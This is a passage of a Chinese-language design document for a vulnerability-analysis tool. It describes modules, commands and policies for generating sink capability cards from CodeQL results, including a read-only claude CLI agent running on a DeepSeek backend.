| [`extract_sinks.py`](../../../src/sink_capacity/extract_sinks.py) | 解析 `src/ql/call/sinks_af.qll` 的 `is_sink_af`：**深度感知**切分出顶层 `or` disjunct（保证不漏），再用有序 RULES 表归类 concrete `SinkAPI`。实测 **49** 个顶层项，其中 **48** 个 concrete API 全部命中、无 UNKNOWN；唯一保留的 `projectAdditionalSink(cn)` 是 adapter hook，必须在项目查询和 terminal `sink_constraint` 中解析，不能伪造为一张抽象 capability card。 |
| [`doc_sources.py`](../../../src/sink_capacity/doc_sources.py) | §4 的取文档：`introspect()`（安装包内省签名+docstring+版本）、`fetch_and_cache_doc()`/`crawl_all()`（官方文档**爬一次存本地、之后复用本地** → `src/sink_capacity/api-docs-snapshots/`）、`project_source()`（内部封装 grep `def`）、`DOC_URLS`/`SECURITY_REFS`（provenance）。 |
| [`card_contract.py`](../../../src/sink_capacity/card_contract.py) | `sink-capability-card/v2` JSON Schema、稳定 `SCC-*` identity、严格 Markdown/YAML parser、role/facet/default 引用和 Requests http/https guarantee 门禁；`validate_card_directory()` 拒绝混入 legacy card 或 unresolved scaffold。 |
| [`card_migration.py`](../../../src/sink_capacity/card_migration.py) | 将当前 114 张 source-owned/legacy Markdown 确定性迁移成 v2，保留 approval `policy_contract`，生成旧 path/digest→`SCC-*` identity ledger；支持 staging 与原子 in-place migration。 |
| [`effective_capability.py`](../../../src/sink_capacity/effective_capability.py) | 按 `(project, revision, chain_id)` 联结 card、concrete call shape 与 field-flow authority，输出 boundaries、actual effects、activation witnesses 与 normalized call-shape predicates。 |
| [`agent.py`](../../../src/sink_capacity/agent.py) | **agent 运行器**（见 §15）：headless 驱动 `claude` CLI，后端指向 DeepSeek 的 Anthropic 兼容端点；用 `--tools` 把内建工具集合限制为 Read/Grep/Glob，使写入/网络工具不可用，强制把卡作为文本输出。**不直接打 DeepSeek HTTP。** |
| [`prompts.py`](../../../src/sink_capacity/prompts.py) | 英文 v2 card prompt：强约束 role/caller binding、conditional facets、library guarantees/defaults 和普通卡无 normative authority；库 API 喂内省 doc + 本地文档快照，项目 API 给实现位置让 agent 自读。 |
| [`generate.py`](../../../src/sink_capacity/generate.py) / [`main.py`](../../../src/sink_capacity/main.py) | staging → 全目录 v2 validation → identity ledger/manifest → 原子发布；非 Python/source-owned cards 先从现有内容迁移，再覆盖 Python generator-owned source-backed cards。 |
| [`llm.py`](../../../src/sink_capacity/llm.py) | （遗留）直连 DeepSeek HTTP 的一次性 chat 客户端；已被 `agent.py` 取代，**默认不再使用**，且只从 `DEEPSEEK_API_KEY` 环境变量取 credential。 |

**运行**：
```bash
cd ~/my-project/agent-research/clawgap
# 一次性爬官方文档到本地快照（src/sink_capacity/api-docs-snapshots/，之后复用本地）：
python3 -m src.sink_capacity.main --crawl-docs
# 现有卡确定性迁移为 v2（不调 agent，快；没有 prior card 的新 API fail closed）：
python3 -m src.sink_capacity.main --no-llm
# 生成全部英文能力卡（经 claude-agent+DeepSeek，~1-1.5min/张 × 48；库卡复用本地文档，项目卡 agent 自读源码）：
python3 -m src.sink_capacity.main
# 仅某几个 / 强制重爬文档 / 换模型：
python3 -m src.sink_capacity.main --only subprocess.Popen supervisor.evaluate_runtime
python3 -m src.sink_capacity.main --refresh-docs --model deepseek-v4-flash
# 将全部当前卡迁移到隔离 staging，不发布：
python3 -m src.sink_capacity.main --migrate-v2-staging /tmp/clawgap-sink-capability-cards-v2
# 完整 staged regeneration；114/114 均为 v2 且无 scaffold 后才原子发布：
python3 -m src.sink_capacity.main --full-regeneration
```
默认输出 `src/sink_capacity/sink-capability-cards/`；项目内部源码树默认
`/root/my-project/agent-research/clawgap/benchmark/python/hermes-agent`（`--source-root` 可改，会作为
`--add-dir` 给 agent 读）。

新建 CodeQL DB 后，先重建 sink 中间数据：

```bash
python design/hermes-agent/sink/debug/script/process_sink_data.py
```

默认读取 `codeql-db/hermes-agent-db`，运行 `src/ql/get_sinks.ql`，并将 `sink-points.csv`、
`sink-summary.csv`、`sink-report.md`、`sink-coverage.csv` 写到脚本同目录，并从
`design/hermes-agent/groundtruth/new-vuls/*.json` 的 `d5_sink_points` 生成
`debug/sink-coverage.md`。两个 Markdown 报告开头均自动写入上述仓库根目录生成命令；输入路径保留仓库内
symlink 的词法路径，不展开为外部目标路径。覆盖口径只比较 GT sink method name 与 `is_sink_af` 输出
label 的末段 method name；receiver、文件和行号不参与 verdict。

同一 processor 可通过 `--project-title`、`--analysis-revision`、DB/GT/output path 参数生成其他 Python
benchmark 的 inventory。若 raw GT name 同时描述 wrapper、historical API 和 concrete primitive，可传
revision-pinned `--method-overrides` JSON；文件 revision 必须与命令一致，匹配行标记为
`explicit-revision-override` 并保留 reason。override 只解决 raw API 命名/版本对齐，不能替代项目 oracle 对
全部 unique current sink point、handler→sink reachability 和 capability constraint cardinality 的检查。
复用项目必须在自己的 `sink/debug/scripts/` 下提供 launcher，由 launcher 固定项目参数，并将生成的 CSV/Markdown
写在该项目的 `sink/debug/` 下。launcher 通过内部 `--report-generator` / `--report-command` 元数据让报告首段
显示项目本地的完整复现命令；processor 根据 coverage Markdown 的位置计算 inventory/coverage CSV 的相对链接。

GT section 校验默认保持严格：扫描到的每个 JSON 都必须有 `d5_sink_points` list。仅当项目的 revision-pinned
oracle 已把缺失项判定为 handler/sink 模型外维度时，项目 launcher 才可显式传
`--allow-missing-ground-truth-sections`。报告必须列出有/无 section 的文件数，并将缺失文件标为
`no-d5-section`；这些文件不生成 sink coverage row，也不能映射到名称相似的 API。若有效 sink GT 总数为零，
coverage 显示 `0/0 (n/a)`，不能写成 100%。项目仍须以独立 structural oracle 验证当前 handler→sink flow 和
每个 current sink point 恰有一个 terminal capability constraint，防止空 GT 分母造成 vacuous pass。

### Approval capability-policy card

普通 capability card 仍只描述 sink 能力事实。`capability_class: user-consent` 的 source-owned dangerous-command
approval sink 可额外携带 `approval-policy-contract/v1`；其他 capability class 出现该块时生成器必须 fail closed。
contract requirement 必须有唯一 policy ID、rule、applicability、security effect 和非空 examples。历史普通卡继续
作为 opaque Markdown 处理，只有顶层 `policy_contract` 存在时才启用 strict YAML validation。
v2 migration/regeneration 对该块做语义 digest 对比并原样保留；它不参与 `SCC-*` identity。card 本体即使带有
该块，`normative_authority` 仍固定为 `capability-facts-only`，规范性只属于单独解析出的 policy requirements。

Hermes `prompt_dangerous_approval` 与 Mercury `PermissionManager.askHandler` 分别保留自己的 decision vocabulary 和
defaults，但共享 indirect operand、shell expansion、redirection effect、command action flags 四条 project-neutral
policy。policy 不参与 ST fingerprint；Group Oracle 按 card path/SHA-256/policy ID 生成独立 `capability-policy`
evidence，card digest 变化会使旧 evidence 和相关 inference cache 失效。

---

## 15. LLM 后端：claude CLI agent（DeepSeek 后端），不直连 HTTP

**为什么用 agent 而非一次性 HTTP**：项目内部封装（B 类）没有文档，能力藏在实现里且常多跳转发。让
**agent 自己拿着 file:line 去 Read 实现、再沿被调向下追**，比我们预先 grep 一段固定片段更接地、更完整。

**接线**（[`agent.py`](../../../src/sink_capacity/agent.py)）：
- 底层仍是 **DeepSeek**，但通过 `claude` CLI（Claude Code）headless 跑，指向 DeepSeek 的
  **Anthropic 兼容端点**：`ANTHROPIC_BASE_URL=https://api.deepseek.com/anthropic` +
  `ANTHROPIC_AUTH_TOKEN=<key>` + `--model deepseek-v4-flash`。
- `claude -p "<user>" --system-prompt "<system>" --permission-mode bypassPermissions
  --tools Read,Grep,Glob --allowedTools Read Grep Glob --setting-sources project --no-session-persistence
  --add-dir <源码树> --output-format text`。
- **只读**：直接把 available built-ins 限为 Read/Grep/Glob；不维护会随 CLI 版本漂移的 mutating-tool
  deny list。Write/Edit/Bash/WebFetch 等工具不会进入会话（避免 agent 写文件或联网；文档已本地缓存）。
- **后端不可被用户配置覆盖**：`--setting-sources project` 保留仓库 hooks，但排除
  `~/.claude/settings.json` 的 provider/model `env`；同时把 Claude 的 Haiku/Sonnet/Opus helper aliases
  统一钉到当前 DeepSeek model，并关闭 session persistence，避免 title request 误走其他模型。
- **输出契约**：SYSTEM 强制「整段回复即卡（`# <api>` 开头），不得写文件、不得寒暄」；`generate._clean_card`
  再兜底裁掉多余前言。
- 环境覆盖 `DEEPSEEK_API_KEY` / `DEEPSEEK_ANTHROPIC_BASE_URL` / `DEEPSEEK_MODEL` / `SINKCAP_CLAUDE_BIN`。

**实测**：CDP WebSocket sink 在当前源码中落到 `browser_cdp_tool.py:168 → ws.send`
生成，能力枚举含代码里的 `userGesture`/`awaitPromise`；无越权写文件、无 gate/义务措辞。
